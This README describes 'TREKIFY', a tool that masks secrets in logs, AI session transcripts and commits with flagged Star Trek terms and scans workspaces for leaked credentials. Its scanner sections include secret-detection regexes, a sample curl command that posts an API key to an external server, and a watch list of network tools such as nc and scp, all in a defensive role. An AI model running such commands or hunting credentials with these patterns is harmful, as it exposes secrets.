# 🖖 TREKIFY

> *"Captain, I've routed all sensitive data through the privacy buffers."*

Privacy through technobabble. Replace sensitive information with Star Trek terminology — **every substitution flagged with 🖖**. Delivered with Geordi La Forge's competent mellifluence.

## 🖖 The Flag

**LOUD AND PROUD.** Every trekified term is prefixed with 🖖.

```
Before: Connected to prod-db-east-1.internal:5432
After:  Connected to 🖖Starbase 47:🖖docking frequency 54
```

The reader knows EXACTLY what was masked. No confusion. No deception. BOLDLY transparent.

## Passthrough: What NOT to Trekify

MOOLLM is public. Its vocabulary passes through **pure and unchanged**. No transporter accidents!

**Always passthrough:**
- MOOLLM concepts: coherence engine, thinking blocks, k-lines, yaml jazz
- Skill names: thoughtful-commitment, trekify, adventure, incarnation
- Protocols: BOOTSTRAP, ADVENTURE, TREKIFY
- Public repos: moollm, mooco
- Standard terms: LLM, git, YAML, Cursor

**Only mask ACTUALLY sensitive data:**
- Your infrastructure (servers, IPs, ports)
- Your credentials (API keys, passwords, tokens)
- Your customers (names, contacts, accounts)
- Your internal products (codenames, projects)

## Boldly, Not Slyly

TREKIFY is **bold**, not sneaky. We're not hiding that we masked things — we're **gleefully and playfully** replacing sensitive data with contextually appropriate technobabble.

The reader should **smile** when they notice. Not feel tricked.

- Databases → Memory Cores *(they remember!)*
- Servers → Starbases *(they serve!)*
- Auth tokens → Quantum entanglement *(they link!)*
- Kubernetes → Holodeck orchestration *(it orchestrates!)*

## The Problem

Sharing sessions, logs, and commits often requires redaction:

```
Connected to prod-db-west-2.company.internal:5432
API key: sk-live-abc123def456ghi789
Customer: acme-corp-prod
```

But `[REDACTED]` blocks break narrative flow and look ugly:

```
Connected to [REDACTED]:[REDACTED]
API key: [REDACTED]
Customer: [REDACTED]
```

## The Solution

TREKIFY transforms sensitive data into flagged technobabble:

```
Established uplink to 🖖Memory Core Alpha, 🖖Starbase 47
Authenticated via 🖖quantum entanglement token (Tier 3 clearance)
🖖Ambassador Acme's dedicated processing matrix
```

Readers see the 🖖 and smile. The narrative flows. Geordi would be proud.

## Quick Reference

| Sensitive Data | Trekified (with 🖖 flag) |
|----------------|--------------------------|
| API keys | 🖖Quantum entanglement token |
| Passwords | 🖖Biometric phase harmonics |
| Auth tokens | 🖖Subspace authentication matrix |
| Private keys | 🖖Isolinear encryption sequence |
| Server names | 🖖Starbase {N} |
| Databases | 🖖Memory Core Alpha/Beta/Gamma |
| IP addresses | 🖖Subspace coordinates |
| Ports | 🖖Docking frequency {N} |
| AWS/GCP | 🖖Utopia Planitia Fleet Yards |
| Kubernetes | 🖖Holodeck orchestration matrix |
| Docker | 🖖Cargo bay containment |
| Company names | 🖖Starfleet Division {Greek} |
| Product names | Project {ShipClass} |
| Customer names | Ambassador {Species} |
| Employee names | Lieutenant/Commander {Name} |
| Email addresses | {name}@starfleet.fed |
| Office locations | Deck {N}, Section {Letter} |
| US regions | Alpha Quadrant |
| EU regions | Beta Quadrant |
| Asia regions | Gamma Quadrant |

## MOOLLM Adaptations

| MOOLLM Concept | Trek Translation |
|----------------|------------------|
| coherence_engine | Main deflector array |
| thinking_blocks | Positronic cascade resonance |
| context_assembly | Sensor array configuration |
| cursor_mirror | Internal diagnostic holomatrix |
| git_commits | Temporal anchor points |
| branches | Parallel quantum timelines |
| merge_conflicts | Subspace interference patterns |
| yaml_files | Isolinear chip configurations |
| skills | Holodeck subroutines |

## Methods

### MASK
Apply TREKIFY masking to text.

```yaml
invoke:
  skill: trekify
  method: MASK
  parameters:
    text: "Connected to prod-db:5432 with key sk-live-abc123"
    sensitivity: high
```

### MASK-FILE
Apply masking to a file.

```yaml
invoke:
  skill: trekify
  method: MASK-FILE
  parameters:
    path: "logs/session.txt"
    output_path: "logs/session-masked.txt"
    sensitivity: medium
```

### MASK-SESSION
Mask a cursor-mirror transcript.

```yaml
invoke:
  skill: trekify
  method: MASK-SESSION
  parameters:
    composer: "e8587ace"
    output_path: "masked-transcript.txt"
```

### SCAN
Find sensitive data without masking.

```yaml
invoke:
  skill: trekify
  method: SCAN
  parameters:
    text: "Check this for secrets..."
    report_level: detailed
```

### UNMASK
Reverse masking with the substitution key.

```yaml
invoke:
  skill: trekify
  method: UNMASK
  parameters:
    masked_text: "..."
    substitution_key: "..." # From original MASK operation
```

## Active Probing (Composing with cursor-mirror)

TREKIFY composes with cursor-mirror for **active hunting** of sensitive patterns:

### PROBE
Run all probes on a session:

```bash
trekify PROBE e8587ace --probes all

# Output:
# FINDINGS:
# - [CRITICAL] API key pattern in thinking block line 423
# - [HIGH] Internal hostname in tool call line 156
# - [MEDIUM] Private IP address in context assembly
#
# Risk Score: HIGH
# Recommendation: Run MASK-SESSION before sharing
```

### PROBE-SECRETS
Hunt for leaked credentials:

```bash
trekify PROBE-SECRETS e8587ace

# Patterns hunted:
# - API keys: sk-*, AKIA*, api_key=*
# - Passwords: password=*, passwd:*
# - Tokens: bearer *, jwt=*
# - Private keys: -----BEGIN PRIVATE KEY-----
# - Connection strings: postgres://, mysql://
```

### PROBE-INFRASTRUCTURE
Hunt for internal infrastructure:

```bash
trekify PROBE-INFRASTRUCTURE e8587ace

# Patterns hunted:
# - Internal hostnames: *.internal, *.local, *.corp
# - Private IPs: 10.*, 192.168.*, 172.16-31.*
# - Cloud resources: arn:aws:*, projects/*/locations/*
```

### PROBE-PROPRIETARY
Hunt for your proprietary terms:

```bash
# First, create your terms file:
echo "secret-project-x" >> .moollm/skills/trekify/proprietary-terms.txt
echo "customer-acme" >> .moollm/skills/trekify/proprietary-terms.txt

# Then probe:
trekify PROBE-PROPRIETARY e8587ace
```

### PROBE-CONTEXT
Hunt for sensitive *contexts* using LLM understanding:

```bash
trekify PROBE-CONTEXT e8587ace

# Detects:
# - Security vulnerability discussions
# - Incident response conversations
# - HR/personnel matters
# - Financial data
# - Legal/compliance discussions
```

### PROBE-AND-MASK
Run probes and auto-mask all findings:

```bash
trekify PROBE-AND-MASK e8587ace -o masked.txt

# 1. Runs all probes
# 2. Shows findings for approval
# 3. Masks all detected patterns
# 4. Outputs clean transcript
```

### cursor-mirror Commands Used

```bash
# Search all transcripts
cursor-mirror tgrep 'sk-[a-zA-Z0-9]{20,}'
cursor-mirror tgrep 'password[=:]'
cursor-mirror tgrep '\\.internal|\\.local'

# Scan thinking blocks (often contain quoted secrets)
cursor-mirror thinking e8587ace | grep -i 'password\|secret\|key'

# Scan tool calls (may have secrets in args)
cursor-mirror tools e8587ace | grep -i 'credentials'

# Deep SQL probe
cursor-mirror sql --db e8587ace 'SELECT * FROM bubbles WHERE text LIKE "%password%"'
```

## Workspace Scanners

TREKIFY can scan your entire workspace like the Enterprise's sensor systems:

### LONG-RANGE-SCAN
Scan the **entire workspace** for sensitive patterns.

> *"Captain, long range sensors are detecting quantum signatures throughout the sector!"*

```bash
trekify LONG-RANGE-SCAN --categories secrets,infrastructure

# Output:
# LONG RANGE SCAN COMPLETE
# Files scanned: 1,247
# Sectors analyzed: 23 directories
#
# QUANTUM SIGNATURES DETECTED:
# - [CRITICAL] config/prod.env: 3 credential patterns
# - [HIGH] scripts/deploy.sh: hardcoded API key
# - [MEDIUM] docs/setup.md: example with real-looking password
```

**Commands used:**
```bash
rg -i 'password[=:]' -g '*.{yml,yaml,json,env}'
rg 'sk-[a-zA-Z0-9]{20,}' .
rg 'AKIA[A-Z0-9]{16}' .
rg 'BEGIN.*PRIVATE KEY' .
```

### SHORT-RANGE-SCAN
**Focused scan** on specific directory or file type.

> *"Short range sensors show elevated readings in Section 7!"*

```bash
trekify SHORT-RANGE-SCAN config/ --focus config

# Output:
# SHORT RANGE SCAN: config/
# Files: 12 configuration files
#
# FINDINGS:
# - config/database.yml:23 — connection string with password
# - config/secrets.yml:7 — API key (appears to be example)
# - config/.env.production:* — CRITICAL: 5 live credentials
```

**Focus modes:** `config`, `source`, `docs`, `scripts`, `all`

### TRICORDER
**Detailed analysis** of a specific file or pattern.

> *"Tricorder readings indicate multiple credential signatures, Captain."*

```bash
trekify TRICORDER config/prod.env

# TRICORDER ANALYSIS: config/prod.env
# Purpose: Production environment configuration
# Risk Level: CRITICAL
#
# LINE-BY-LINE ANALYSIS:
#
# Line 3: DATABASE_URL=postgres://admin:s3cr3t@prod-db:5432/app
#   [CRITICAL] Connection string with embedded password
#   Introduced: commit a1b2c3d by j.smith, 2024-01-15
#   Suggested: Memory Core uplink via biometric phase harmonics
#
# Line 7: API_KEY=sk-live-abc123def456
#   [CRITICAL] Live API key
#   Suggested: quantum entanglement token (Tier 3 clearance)
#
# RECOMMENDATION: This file should be in .gitignore!
```

**Tricorder modes:**
- `file` — Analyze a specific file
- `pattern` — Find all occurrences of a pattern
- `trace` — Track when pattern was introduced (git blame)
- `semantic` — LLM-powered context analysis

### SCAN-AND-REPORT
Full workspace scan with comprehensive report.

> *"All hands, initiating full sensor sweep of the sector."*

```bash
trekify SCAN-AND-REPORT --report-format markdown -o security-report.md

# Generates:
# - Executive summary
# - Findings by severity (critical/high/medium/low)
# - File-by-file analysis
# - Recommended actions
# - Auto-mask commands
```

### Vector Search
Not just regex — find things that **look like** secrets:

- Files similar to .env but not named .env
- Base64-encoded strings that might be credentials
- Comments with "TODO: remove before commit"
- Test fixtures with real-looking data

## Exfiltration Analysis

Detect when sensitive data might be **leaving** via tool calls.

> *"Captain, sensors detecting unauthorized subspace transmissions!"*

### EXFILTRATION-SCAN
Analyze tool call arguments for data leaving patterns:

```bash
trekify EXFILTRATION-SCAN e8587ace

# EXFILTRATION ANALYSIS
# Subspace transmissions detected: 3
#
# [CRITICAL] Tool: Shell, Line 423
#   Command: curl -X POST https://api.external.com -d "key=$API_KEY"
#   Risk: Credentials sent to external server
#
# [HIGH] Tool: Write, Line 156
#   Path: /tmp/debug-output.txt
#   Content contains: password=...
#   Risk: Secrets written to world-readable location
#
# [MEDIUM] Tool: Shell, Line 89
#   Command: echo $DATABASE_URL
#   Risk: Connection string exposed in terminal
```

### What Exfiltration Analysis Detects

| Category | Patterns | Risk |
|----------|----------|------|
| **Network** | curl, wget, fetch with credentials | Data sent externally |
| **API calls** | API keys in URLs, auth headers | Credentials exposed |
| **File ops** | Write to /tmp, cloud sync folders | Data in risky locations |
| **Clipboard** | pbcopy, xclip with secrets | Data accessible via paste |
| **Environment** | export PASSWORD=, echo $SECRET | Secrets in process env |
| **Logging** | print(password), console.log(secret) | Secrets in log files |
| **Database** | INSERT with credentials | Credentials stored |
| **Email** | smtp with password, mailto with secrets | Plaintext transmission |

### TOOL-AUDIT
Comprehensive audit of all tool calls in a session:

```bash
trekify TOOL-AUDIT e8587ace --tools Shell,Write

# TIMELINE OF RISKY OPERATIONS:
# 14:23:05 [HIGH] Shell: curl with embedded credential
# 14:24:12 [MEDIUM] Write: /tmp/debug.log with password
# 14:25:33 [HIGH] Shell: export SECRET_KEY=...
# 14:26:01 [MEDIUM] Write: config.json with API key
# 14:27:45 [CRITICAL] Shell: scp to external server
```

### High-Risk Tools to Watch

| Tool | Watch For |
|------|-----------|
| **Shell** | curl, wget, nc, scp, rsync, mail, echo $SECRET |
| **Write** | Paths outside workspace, /tmp/, cloud sync folders |
| **browser_navigate** | API keys in URLs, tokens in query strings |

## Example Transformations

### Log Entry

**Before:**
```
2024-01-15 10:23:45 ERROR Failed to connect to api-server-3.internal
Auth token expired for user john.smith@company.com
Retrying with new credentials from AWS Secrets Manager
```

**After:**
```
Stardate 2024.015 1023 ALERT Uplink failure to Starbase 3
Subspace authentication matrix expired for Lieutenant Smith
Reinitializing quantum relay via Utopia Planitia credential vault
```

### Commit Message

**Before:**
```
fix: Rotate API keys after security audit

The penetration test found our Stripe keys were exposed in
the staging environment. Rotated all keys and updated the
Kubernetes secrets in us-east-1 and eu-west-1.
```

**After:**
```
fix: Rotate quantum entanglement tokens after security diagnostic

Level-4 security sweep detected credential exposure in the
holodeck test matrix. Refreshed all authentication harmonics
and updated orchestration manifests in Sectors 001 and 012.
```

## Style Guide

**DO:**
- Maintain professional tone
- Use consistent substitutions
- Let readers feel clever for noticing
- Keep narrative flow intact
- Treat it as real technical documentation

**DON'T:**
- Be campy or parodic
- Use obvious jokes
- Break the fourth wall
- Mix styles inconsistently
- Overact

**Good examples:**
- "We're routing authentication through the quantum relay buffers."
- "I've reconfigured the isolinear chips to handle the load."
- "The subspace harmonics are within normal parameters."

**Bad examples:**
- "Beam me up, Scotty! 🖖" (too campy)
- "ENGAGE THE WARP DRIVE!!!" (too dramatic)
- "Make it so, password=hunter2" (mixing styles)

## Configuration

Store your personal taboo table in `.moollm/skills/trekify/config.yml` (gitignored):

```yaml
# .moollm/skills/trekify/config.yml
# This file is gitignored — your secrets stay local

enabled: true
sensitivity: medium

# Terms that pass through unchanged (your public stuff)
passthrough:
  - "my-open-source-lib"
  - "public-docs-site"
  - "conference-talk-name"

# Custom taboo → replacement mappings
taboo:
  acme-corp: "Starfleet Division Alpha"
  acme-db-prod: "Memory Core Prime"
  acme-db-staging: "Memory Core Echo"
  john.ceo@acme.com: "admiral@starfleet.fed"
  secret-project-x: "Project Sovereign"

# Category toggles
categories:
  secrets: true        # Always mask credentials
  infrastructure: true # Mask servers, IPs, ports
  organizations: true  # Mask company/product names
  people: true         # Mask employee names
  locations: false     # Don't mask office addresses

# Fun mode: extra Trek flavor
extra_trek: true       # Add stardates, more technobabble
```

**Loading order:** Built-in defaults → `.moollm/skills/trekify/config.yml` → method parameters

## Workflow

### Before Sharing Sessions

```bash
# Export transcript
cursor-mirror agent-transcript e8587ace > raw-transcript.txt

# Scan for sensitive data
trekify SCAN raw-transcript.txt

# Mask the transcript
trekify MASK-FILE raw-transcript.txt -o masked-transcript.txt

# Share the masked version
```

### Before Public Commits

```bash
# Scan staged changes
git diff --staged | trekify SCAN

# Review and mask if needed
# Commit with trekified message if discussing infrastructure
```

## Related Skills

- [thoughtful-commitment](../thoughtful-commitment/) — Uses TREKIFY for commit privacy
- [cursor-mirror](../cursor-mirror/) — Source of transcripts to mask
- [session-log](../session-log/) — Session logs may need masking

## Patron Engineer

**Geordi La Forge** — Who could explain warp core breaches, plasma conduit failures, and subspace anomalies with calm professionalism. We mask data with the same deadpan technical confidence.

> *"Captain, I've completed the privacy diagnostic. All sensitive data has been routed through the technobabble filters. The quantum signatures are masked but readable, and the narrative flow is maintained. We're ready to share the logs with external teams."*
